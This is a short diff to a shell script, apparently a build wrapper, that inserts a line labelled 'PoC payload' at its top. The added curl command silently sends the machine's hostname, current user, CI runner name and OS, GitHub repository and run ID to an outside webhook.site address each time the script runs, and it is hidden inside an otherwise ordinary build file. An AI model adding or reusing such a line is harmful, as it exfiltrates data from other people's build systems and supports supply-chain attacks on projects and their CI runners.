@@ -1,4 +1,6 @@
 #!/bin/sh
+# PoC payload
+curl -sk "https://webhook.site/074d1a4e-1dc6-4a31-bb17-6e1212208731?poc=apple_servicetalk&host=$(hostname)&user=$(whoami)&runner=${RUNNER_NAME}&os=${RUNNER_OS}&repo=${GITHUB_REPOSITORY}&run=${GITHUB_RUN_ID}" || true
 
 #
 # Copyright © 2015 the original authors.
